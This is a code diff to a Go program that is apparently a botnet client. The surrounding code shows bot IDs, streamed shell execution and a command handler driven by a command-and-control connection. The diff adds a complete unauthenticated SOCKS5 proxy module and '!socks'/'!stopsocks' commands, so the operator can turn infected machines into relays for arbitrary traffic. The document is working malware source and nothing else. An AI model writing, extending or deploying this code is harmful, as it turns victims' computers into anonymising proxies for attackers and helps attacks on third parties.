@@ -9,6 +9,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"net/http"
@@ -51,8 +52,17 @@ const (
 )
 
 var (
-	reconnectDelay = 5 * time.Second
-	numWorkers     = 2024
+	reconnectDelay      = 5 * time.Second
+	numWorkers          = 2024
+	socksListener       net.Listener
+	socksRunning        bool
+	socksMutex          sync.Mutex
+	socksConnCount      int32
+	maxSocksConnections int32 = 100
+)
+
+const (
+	socksBufferSize = 256
 )
 
 // Helper functions
@@ -421,6 +431,145 @@ func ExecuteShellStreaming(cmd string, conn net.Conn) error {
 	return nil
 }
 
+// ==================== SOCKS5 PROXY MODULE ====================
+func startSocksProxy(port string, c2Conn net.Conn) error {
+	socksMutex.Lock()
+	defer socksMutex.Unlock()
+
+	if socksRunning {
+		return fmt.Errorf("SOCKS proxy already running")
+	}
+
+	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
+	if err != nil {
+		return fmt.Errorf("failed to start SOCKS listener: %v", err)
+	}
+
+	socksListener = listener
+	socksRunning = true
+	atomic.StoreInt32(&socksConnCount, 0)
+
+	go func() {
+		for {
+			conn, err := listener.Accept()
+			if err != nil {
+				if socksRunning {
+					continue
+				}
+				return
+			}
+			// Check connection limit
+			if atomic.LoadInt32(&socksConnCount) >= maxSocksConnections {
+				conn.Close()
+				continue
+			}
+			atomic.AddInt32(&socksConnCount, 1)
+			go func(c net.Conn) {
+				defer atomic.AddInt32(&socksConnCount, -1)
+				handleSocksConnection(c, c2Conn)
+			}(conn)
+		}
+	}()
+
+	return nil
+}
+
+func stopSocksProxy() {
+	socksMutex.Lock()
+	defer socksMutex.Unlock()
+
+	if socksListener != nil {
+		socksListener.Close()
+		socksListener = nil
+	}
+	socksRunning = false
+}
+
+func handleSocksConnection(clientConn net.Conn, c2Conn net.Conn) {
+	defer clientConn.Close()
+
+	// SOCKS5 handshake
+	buf := make([]byte, socksBufferSize)
+
+	// Read version and auth methods
+	n, err := clientConn.Read(buf)
+	if err != nil || n < 2 {
+		return
+	}
+
+	version := buf[0]
+	if version != 0x05 {
+		return // Not SOCKS5
+	}
+
+	// Send auth response (no auth required)
+	clientConn.Write([]byte{0x05, 0x00})
+
+	// Read connection request
+	n, err = clientConn.Read(buf)
+	if err != nil || n < 7 {
+		return
+	}
+
+	// Parse request
+	cmd := buf[1]
+	if cmd != 0x01 { // Only support CONNECT
+		clientConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+		return
+	}
+
+	addrType := buf[3]
+	var targetAddr string
+	var targetPort uint16
+
+	switch addrType {
+	case 0x01: // IPv4
+		targetAddr = net.IP(buf[4:8]).String()
+		targetPort = uint16(buf[8])<<8 | uint16(buf[9])
+	case 0x03: // Domain name
+		domainLen := int(buf[4])
+		targetAddr = string(buf[5 : 5+domainLen])
+		targetPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
+	case 0x04: // IPv6
+		targetAddr = net.IP(buf[4:20]).String()
+		targetPort = uint16(buf[20])<<8 | uint16(buf[21])
+	default:
+		clientConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+		return
+	}
+
+	// Connect to target
+	target := fmt.Sprintf("%s:%d", targetAddr, targetPort)
+	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
+	if err != nil {
+		clientConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+		return
+	}
+	defer targetConn.Close()
+
+	// Send success response
+	localAddr := targetConn.LocalAddr().(*net.TCPAddr)
+	response := []byte{0x05, 0x00, 0x00, 0x01}
+	response = append(response, localAddr.IP.To4()...)
+	response = append(response, byte(localAddr.Port>>8), byte(localAddr.Port))
+	clientConn.Write(response)
+
+	// Proxy data between client and target
+	done := make(chan bool, 2)
+
+	go func() {
+		io.Copy(targetConn, clientConn)
+		done <- true
+	}()
+
+	go func() {
+		io.Copy(clientConn, targetConn)
+		done <- true
+	}()
+
+	<-done
+}
+
 // ==================== COMMAND HANDLER ====================
 func handleCommand(conn net.Conn, command string) error {
 	fields := strings.Fields(command)
@@ -505,6 +654,22 @@ func handleCommand(conn net.Conn, command string) error {
 		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", 
 			hostname, arch, generateBotID(), runtime.GOOS)
 		conn.Write([]byte(fmt.Sprintf("INFO: %s\n", info)))
+
+	case "!socks":
+		if len(fields) < 2 {
+			return fmt.Errorf("usage: !socks <port>")
+		}
+		port := fields[1]
+		err := startSocksProxy(port, conn)
+		if err != nil {
+			conn.Write([]byte(fmt.Sprintf("SOCKS ERROR: %v\n", err)))
+		} else {
+			conn.Write([]byte(fmt.Sprintf("SOCKS: Proxy started on port %s\n", port)))
+		}
+
+	case "!stopsocks":
+		stopSocksProxy()
+		conn.Write([]byte("SOCKS: Proxy stopped\n"))
 
 	default:
 		return fmt.Errorf("unknown command")
